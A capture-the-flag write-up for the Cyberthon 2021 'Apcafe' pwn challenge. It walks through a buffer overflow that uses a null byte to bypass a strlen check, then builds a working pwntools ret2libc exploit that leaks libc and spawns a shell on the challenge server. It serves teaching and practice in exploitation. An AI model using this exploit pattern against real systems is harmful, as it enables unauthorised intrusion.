### Apcafe

---

### Description

> We've received intel that APOCALYPSE is running a cafe as a front for their illegal activities. Although it seems like a regular cafe on the outside, serving local favourites such as Kopi-O, Milo, and Yuan Yang, we believe that something more sinister is going on. Could u try to find a way to break in so we can investigate further?

> Interact with the service at: aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg:30101

> Note: once you get a shell, the flag.txt can be found in the user's home directory.

[apcafe.zip](https://github.com/caprinux/Cyberthon-2021/files/6445700/apcafe.zip)

---

### Walkthrough

Running the binary, we are presented with a menu of drinks to select from, and exits upon selecting a drink.

![image](https://user-images.githubusercontent.com/76640319/117536365-38ecec00-b02d-11eb-93d2-8965f0b3be18.png)

We decompile this binary in IDA pro to get a clearer look at what is going on.

```c
main{

  char v4[10]; // [rsp+6h] [rbp-Ah] BYREF

  setup_IO(argc, argv, envp);
  banner();
  printf("What do you want to order? ");
  __isoc99_scanf("%s", v4);
  serve_order(v4);
  return 0;

}
```

As we can see, main function does a few things:

1. It defines v4, and gives it a buffer of 10 bytes.
2. It prints a banner and a question
3. It scans in an input with **%s** string _(which does not limit number of bytes)_
4. It calls serve_order() before returning.

Let's analyse serve_order() first before making any conclusions.

```c
  if ( strlen(v4) > 0xA )
  {
    puts(s);
    puts("Huh? What kind of weird order is this? Please leave.\n");
    exit(0);
  }
  for ( i = 0; i <= 4; ++i )
  {
    if ( !strcmp(v4, &DRINKS[10 * i]) )
    {
      puts(s);
      puts("*****************************");
      printf(" Here is your %s!\n", &DRINKS[10 * i]);
      puts("*****************************");
      puts("ASCII ART HERE")
      return puts("Bye! Hope to see you again!");
    }
  }
  puts(s);
  return printf("Sorry, we don't sell %s...\n", v4);
}
```

As we can see, 

1. serve_order takes our previous input, **v4**, and checks its string length against 0xA with the strlen() function. _vulnerable!!_
2. If string length of our input is longer than 0xA, it will immediately exit the program.

Now that we have a bigger picture, we are aware that we have a buffer overflow at scanf. However, if we blindly overflow, the program will exit when it checks **strlen(v4) > 0xA**.

This is where strlen function comes in:

> The C library function size_t strlen(const char *str) computes the length of the string str up to, but not including the terminating null character. 

Since strlen only counts up to a terminating null character, we can artificially put in a terminating null character.

Now that we have control over our return pointer, how could we exploit this program? A simple ret2libc should suffice.

Now we can start writing the first stage of our script.

```py
p = remote('aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg', 30101)  # connect to remote service
context.binary = elf = ELF('apcafe')                          # provide the context to our pwntools
#libc = ??

payload = b'water\x00'                                        # put any string with a valid size
payload += b"A" * (0x12 - len(payload))                       # pad up to 10+8 chracters to reach the return address
```

The logic of the exploit will go like this.

1. We overflow the buffer and reach the return address,
2. With the return address, we leak libc and loop back to the program
3. With our LIBC leak, we can find the libc on the remote server
4. With the LIBC on the remote server, we can calculate the address of **system()**.
5. Return to LIBC system('/bin/sh\x00')

Let's continue to try and leak ourselves a LIBC.

```py
p = remote('aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg', 30101)  # connect to remote service
context.binary = elf = ELF('apcafe')                          # provide the context to our pwntools
#libc = ??

payload = b'water\x00'                                        # put any string with a valid size
payload += b"A" * (0x12 - len(payload))                       # pad up to 10+8 chracters to reach the return address

rop = ROP(elf)                                                # set up our rop chain
rop.puts(elf.got.puts)                                        # leak puts GOT
rop.puts(elf.got.printf)                                      # leak printf GOT
p.sendline(payload + rop.chain())

p.recvuntil(b'Sorry, we don't sell water...')
p.recvline()
puts = hex(u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00'))) # puts leak
printf = hex(u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00'))) # printf leak
```

Running the script, we will easily find the addresses of puts and printf.

> 0x7fb9231935a0

> 7fb923170e10

When we use these addresses to find the LIBC, we are presented with 3 similar LIBCs:

![image](https://user-images.githubusercontent.com/76640319/117537056-4015f900-b031-11eb-9e03-755edf966304.png)

This can be easily narrowed down by leaking more function addresses or simply by just trying all 3.

Let's continue with the remaining of our script, but this time we have our libc

```py
p = remote('aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg', 30101)  # connect to remote service
context.binary = elf = ELF('apcafe')                          # provide the context to our pwntools
libc = ELF('libc6_2.31-0ubuntu9_amd64.so')

payload = b'water\x00'                                        # put any string with a valid size
payload += b"A" * (0x12 - len(payload))                       # pad up to 10+8 chracters to reach the return address

rop = ROP(elf)                                                # set up our rop chain
rop.puts(elf.got.puts)                                        # leak puts GOT
rop.puts(elf.got.printf)                                      # leak printf GOT
p.sendline(payload + rop.chain())

p.recvuntil(b'Sorry, we don't sell water...')
p.recvline()
puts = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00')) # puts leak
printf = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00')) # printf leak

libc.address = printf - libc.sym.printf                       # find libc base address

rop = ROP([elf, libc])                                        # reset rop chain
rop.call(rop.ret[0])                                          # align the stack
rop.system(next(libc.search(b'/bin/sh')))                     # call system('/bin/sh')

rop.interactive()
```


There we have the main outline of our code. After some cleaning up we are done!

```py
# coding: utf-8
p = remote('aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg', 30101)  # connect to remote service
context.binary = elf = ELF('apcafe')                          # provide the context to our pwntools
libc = ELF('libc6_2.31-0ubuntu9_amd64.so')

payload = b'water\x00'                                        # put any string with a valid size
payload += b"A" * (0x12 - len(payload))                       # pad up to 10+8 chracters to reach the return address

rop = ROP(elf)                                                # set up our rop chain
rop.puts(elf.got.puts)                                        # leak puts GOT
#rop.puts(elf.got.printf)                                      # leak printf GOT
rop.main()
p.sendline(payload + rop.chain())

p.recvuntil(b"Sorry, we don't sell water...")
p.recvline()
puts = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00')) # puts leak
#printf = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00')) # printf leak

libc.address = puts - libc.sym.puts

binsh = (next(libc.search(b'/bin/sh')))
rop = ROP([libc, elf])
rop.call(rop.ret[0])                                          # align the stack
rop.system(binsh)                                             # call system('/bin/sh')
p.sendline(payload + rop.chain())

p.clean()
p.sendline('cat */*/flag*')
print(p.recvall())
```

**Cyberthon{th4t5_4_r34lly_l000ng_0rd3r_dud3_pl5_ch1ll}**
